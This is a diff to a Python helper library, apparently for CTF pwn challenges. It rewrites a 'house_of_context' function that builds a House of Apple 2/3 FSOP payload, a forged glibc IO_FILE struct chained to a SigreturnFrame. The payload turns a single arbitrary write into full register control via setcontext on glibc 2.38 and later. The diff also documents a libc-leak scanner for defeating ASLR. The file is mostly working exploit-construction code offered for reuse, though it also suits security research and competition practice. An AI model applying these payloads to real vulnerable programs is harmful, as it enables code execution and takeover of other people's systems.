@@ -86,52 +86,60 @@ def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
         setcontext(kwargs, got+0x218),
     )
 
-
-"""
-NOTES (not implemented yet):
-attacking stdout is possible by writing the ucontext afterwards
-the only important things infront are the 'stdout'/'stderr'/'stdin' pointers but you can just spray those with &stdout 
-maybe we can house of apple2 into house of apple3 (like call the function that causes hoa3)
-ik this sounds really fucking stupid but it removes the exit() requirement while not needing any crazy rop gadgets
-there might a house with good rdi control that work without exit() though idk need to look into it more
-"""
-# setcontext32 but twice as small and works past 2.38
-# tldr is stdin filestream has a bunch of scratch space behind it
-# so we can write a ucontext_t there then fsop to setcontext
-# HOWEVER only happens on exit. if this is a problem you can fsop stdout to call exit.
-def house_of_context(libc,**kwargs) -> (int, bytes):
+# setcontext32 (single arbitrary write in libc -> full register control) but works past 2.38 
+# the idea is we fsop stderr/stdout with a file that's a houseofapple2/3 polyglot,
+# and the houseofapple2 payload calls houseofapple3. we use houseofapple3 because it has
+# much better RDI control, letting us jump to setcontext
+# as for where we store the ucontext, we place it directly after the filestream
+# for stderr, only important thing we corrupt is stdout, not a problem 
+#      (because when it is, attack stdout instead)
+# for stdout, we corrupt stdin/stderr/stdout pointers, which we fix by spraying &stdout 
+def house_of_context(libc,file='stdout',**kwargs) -> (int, bytes):
     assert context.bits == 64, "only support amd64!"
-    
-    # add rdi, 0x10; jmp rcx
-    gadget = next(libc.search(b'\x48\x83\xc7\x10\xff\xe1',executable=True))
-    stdin_addr = libc.sym["_IO_2_1_stdin_"]
-    begin = stdin_addr - len(setcontext({}, 0))
-    
-    kwargs.setdefault('rsp',libc.sym['__pthread_keys']+0x2000)
-    kwargs['uc_stack.ss_flags'] = gadget # fsop payload calls this, useless for pwn
-    buf = setcontext(kwargs,begin)
+    assert file in ['stdout', 'stderr'], "only support stdout/stderr"
+
     # ensure alignment so we can tcache poison
-    padding = begin & 0x8
-    begin -= padding
-    buf = b'A'*(padding) + buf
-    
-    setctx = libc.sym['setcontext']
-    
-    # house of apple3
+    # i dont think its needed (file streams are always aligned) but its like 3 lines of code
+    fst = libc.sym[f'_IO_2_1_{file}_']
+    padding = fst & 0x8
+
+    # add rdi, 0x10; jmp rcx
+    # technically not required but you can't set r8 otherwise
+    gadget = next(libc.search(b'\x48\x83\xc7\x10\xff\xe1',executable=True))
+
+    kwargs.setdefault('rsp',libc.sym['__pthread_keys']+0x2000)
+    kwargs.setdefault('&fpstate',libc.sym['__pthread_keys']+0x120)
+    kwargs['uc_stack.ss_flags'] = gadget
+
+    frame = SigreturnFrame()
+    for reg, val in kwargs.items():
+        setattr(frame, reg, val)
+
+    # house of apple3 alternative path
+    # calls fp._codecvt->__cd_in.step->__fct 
+    #         +0x98     +0x0    +0x0  +0x28
     fp = IO_FILE_plus_struct()
-    fp.flags = 1
-    fp._IO_read_ptr = setctx+0x4
-    fp._IO_read_end = setctx+0x3
-    fp._IO_write_ptr = 1
-    fp._IO_write_end = 2
-    fp._IO_save_end = begin-0x10+padding
-    fp._lock = libc.sym['__pthread_keys']
-    fp._codecvt = (stdin_addr-0x38) + 0x58
-    fp._wide_data = stdin_addr + 0x8 - 0x18
-    fp._mode = 1
-    fp.vtable = libc.sym['_IO_file_jumps']
-    
-    return begin, buf+bytes(fp)
+    fp._IO_read_ptr = 0x1234
+    fp._IO_read_end = libc.sym['setcontext'] # rcx
+
+    # hoa2 path
+    fp._IO_write_ptr = 2
+    fp._IO_write_end = 1
+    fp.chain = libc.sym['_IO_wfile_underflow']
+  
+    fp._codecvt = fst + 0xa0 + 0x30 # std.file._IO_backup_base
+    fp.unknown2 = p64(0)*5 + p64(fst + len(bytes(fp))+8*8)
+    fp._lock = libc.sym['__pthread_keys']+0x110 
+    fp._wide_data = fst + 0x28
+    fp.vtable = libc.sym['_IO_wfile_jumps']#-0x18
+
+    return (fst-padding), flat(
+        b'A'*padding,
+        bytes(fp), # fsop payload
+        p64(fst)*8, # after _IO_2_1_stdout are stderr/stdin/stdout pointers, spray with &stdout
+        p64(0)*2, # to satisfy hoa3 constraints (__cd_in.step.__shlib_handle == NULL)
+        bytes(frame) # setcontext payload
+    )
 
 def pack_file(_flags = 0,
               _IO_read_ptr = 0,
@@ -176,6 +184,20 @@ def pack_file(_flags = 0,
     return file_struct
 
 def find_libc_leak(memory_dump, target_addr, aligned=False, is_32bit=False):
+    """
+    given a large dump of memory, `memory_dump`,
+    scan it for the lower 12 bits of `target_addr` (since aslr does not affect it),
+    return the full pointer if found
+    `aligned`: assume the memory dump is 8-byte aligned
+    `is_32bit`: working with 32-bit program
+
+    ex: if you get the program to do something like `write(1,stdout,0x5000)`
+    you can do the following:
+    libc = ELF("./libc.so.6")
+    dump = p.recvn(0x5000) #  # &stdin is probably somewhere in here
+    leak = find_libc_leak(dump, libc.sym["_IO_2_1_stdin_"])
+    libc.address = leak - libc.sym["_IO_2_1_stdout_"]
+    """
     ptr_sz = 4 if is_32bit else 8
     
     if len(memory_dump) < ptr_sz:
@@ -224,3 +246,22 @@ def find_libc_leak(memory_dump, target_addr, aligned=False, is_32bit=False):
         info(f"Candidate {hex(ptr)} found at offsets: {offsets[:3]}{'...' if len(offsets) > 3 else ''}")
         
     return heuristic_matches[0][1]
+
+# stuff i commonly write in solve scripts (may move to own module in the future)
+
+# maybe not worth stripping this one since
+# A) makes it harder to share B) may forget syntax C) cannot change colon
+def set_alias(p):
+    p.sla = p.sendlineafter
+    p.sl = p.sendline
+    p.sa = p.sendafter
+    p.s = p.send
+    p.ru = p.readuntil
+    p.rl = p.readline
+    p.sc = lambda x: p.sa(b':',x)
+    p.slc = lambda x: p.sla(b':',x)
+    p.snc = lambda x: p.sla(b':',str(x).encode())
+    return p
+
+def i2b(n: int):
+    return str(n).encode()
